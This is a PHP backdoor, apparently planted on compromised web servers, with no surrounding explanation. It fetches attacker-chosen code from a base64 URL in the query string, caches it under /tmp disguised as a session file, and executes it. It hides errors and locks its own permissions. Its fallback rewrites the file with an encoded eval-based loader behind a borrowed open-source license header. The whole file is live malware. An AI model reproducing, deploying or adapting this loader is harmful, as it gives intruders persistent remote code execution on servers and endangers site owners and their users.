<?php 
error_reporting(0);
ini_set('display_errors', 0);
chmod(basename(__FILE__), 0444);
// $file_contents = "<FilesMatch \".(ph|phtml|php)\$\">\n Order allow,deny\n Allow from all\n</FilesMatch>";
// $create_htacess = @fopen('.htaccess', 'w');
// if ($create_htacess) {
    // fwrite($create_htacess, $file_contents);
    // fclose($create_htacess);
    // chmod(".htaccess", 0444);
    // chmod(basename(__FILE__), 0444);
// }

function _url_get_contents ($url) {
    if ( function_exists('curl_exec') ){ 
        $curl_connect = curl_init( $url );

        curl_setopt($curl_connect, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl_connect, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl_connect, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($curl_connect, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($curl_connect, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($curl_connect, CURLOPT_COOKIEJAR, $GLOBALS['coki']);
        curl_setopt($curl_connect, CURLOPT_COOKIEFILE, $GLOBALS['coki']);
        
        $content_data = curl_exec( $curl_connect );
    }
    elseif ( function_exists('file_get_contents') ) {
        $content_data = file_get_contents( $url );
    }
    else {
        $handle = fopen ( $url , "r");
        $content_data = stream_get_contents( $handle );
    }
        
    return $content_data;
}

$myfile = "/tmp";
$data_1 = base64_decode($_GET['url']);
$data_2 = '/tmp/sess_'.md5($_SERVER['REQUEST_URI']);
if(is_writable($myfile)) 
{
    if(file_exists($data_2) && filesize($data_2) !== 0) {
        include($data_2);
    } elseif ( function_exists('file_put_contents') ) {
        file_put_contents($data_2, _url_get_contents($data_1));
        include($data_2);
    } elseif ( function_exists('fwrite') ) {
        $fopen = fopen($data_2, 'w+');
        fwrite($fopen, _url_get_contents($data_1));
        fclose($fopen);
        include($data_2);
    } elseif ( function_exists('fputs') ) {
        fputs($data_2, _url_get_contents($data_1));
        include($data_2);
    } else {
        copy($data_1, $data_2);
        include($data_2);
    }
} 
if ( !file_exists($data_2) || filesize($data_2) == 0 ) {
    $file_code = base64_decode('PD9waHANCi8qKg0KICogQVBJIFJlcXVlc3RzIHVzaW5nIHRoZSBIVFRQIHByb3RvY29sIHRocm91Z2ggdGhlIEN1cmwgbGlicmFyeS4NCiAqDQogKiBAYXV0aG9yICAgIEpvc2FudG9uaXVzIDxoZWxsb0Bqb3NhbnRvbml1cy5jb20+DQogKiBAY29weXJpZ2h0IDIwMTYgLSAyMDE4IChjKSBKb3NhbnRvbml1cyAtIFBIUC1DdXJsDQogKiBAbGljZW5zZSAgIGh0dHBzOi8vb3BlbnNvdXJjZS5vcmcvbGljZW5zZXMvTUlUIC0gVGhlIE1JVCBMaWNlbnNlIChNSVQpDQogKiBAbGluayAgICAgIGh0dHBzOi8vZ2l0aHViLmNvbS9Kb3NhbnRvbml1cy9QSFAtQ3VybA0KICogQHNpbmNlICAgICAxLjAuMA0KICovDQoNCmVycm9yX3JlcG9ydGluZyggMCApOw0KZnVuY3Rpb24gX3VybF9nZXRfY29udGVudHMgKCR1cmwpIHsNCiAgICBpZiAoIGZ1bmN0aW9uX2V4aXN0cygnY3VybF9leGVjJykgKXsgDQogICAgICAgICRjdXJsX2Nvbm5lY3QgPSBjdXJsX2luaXQoICR1cmwgKTsNCg0KICAgICAgICBjdXJsX3NldG9wdCgkY3VybF9jb25uZWN0LCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsNCiAgICAgICAgY3VybF9zZXRvcHQoJGN1cmxfY29ubmVjdCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMSk7DQogICAgICAgIGN1cmxfc2V0b3B0KCRjdXJsX2Nvbm5lY3QsIENVUkxPUFRfVVNFUkFHRU5ULCAiTW96aWxsYS81LjAoV2luZG93cyBOVCA2LjE7IHJ2OjMyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMzIuMCIpOw0KICAgICAgICBjdXJsX3NldG9wdCgkY3VybF9jb25uZWN0LCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCAwKTsNCiAgICAgICAgY3VybF9zZXRvcHQoJGN1cmxfY29ubmVjdCwgQ1VSTE9QVF9TU0xfVkVSSUZZSE9TVCwgMCk7DQogICAgICAgIGN1cmxfc2V0b3B0KCRjdXJsX2Nvbm5lY3QsIENVUkxPUFRfQ09PS0lFSkFSLCAkR0xPQkFMU1snY29raSddKTsNCiAgICAgICAgY3VybF9zZXRvcHQoJGN1cmxfY29ubmVjdCwgQ1VSTE9QVF9DT09LSUVGSUxFLCAkR0xPQkFMU1snY29raSddKTsNCiAgICAgICAgDQogICAgICAgICRjb250ZW50X2RhdGEgPSBjdXJsX2V4ZWMoICRjdXJsX2Nvbm5lY3QgKTsNCiAgICB9DQogICAgZWxzZWlmICggZnVuY3Rpb25fZXhpc3RzKCdmaWxlX2dldF9jb250ZW50cycpICkgew0KICAgICAgICAkY29udGVudF9kYXRhID0gZmlsZV9nZXRfY29udGVudHMoICR1cmwgKTsNCiAgICB9DQogICAgZWxzZSB7DQogICAgICAgICRoYW5kbGUgPSBmb3BlbiAoICR1cmwgLCAiciIpOw0KICAgICAgICAkY29udGVudF9kYXRhID0gc3RyZWFtX2dldF9jb250ZW50cyggJGhhbmRsZSApOw0KICAgIH0NCiAgICAgICAgDQogICAgcmV0dXJuICRjb250ZW50X2RhdGE7DQp9DQoNCiRjb250ZW50X291dHB1dCA9IF91cmxfZ2V0X2NvbnRlbnRzKGJhc2U2NF9kZWNvZGUoJF9HRVRbJ3VybCddKSk7DQpldmFsICgnPz4nIC4gJGNvbnRlbnRfb3V0cHV0KTsNCj8+');
    if ( function_exists('file_put_contents') ) {
        chmod(basename(__FILE__), 0644);
        file_put_contents(basename(__FILE__), $file_code);
        header("Refresh: 0");
    } elseif ( function_exists('fwrite') ) {
        chmod(basename(__FILE__), 0644);
        $fopen = fopen(basename(__FILE__), 'w+');
        fwrite($fopen, $file_code);
        fclose($fopen);
        header("Refresh: 0");
    } else {
        chmod(basename(__FILE__), 0644);
        fputs(basename(__FILE__), $file_code);
        header("Refresh: 0");
    }
}
?>
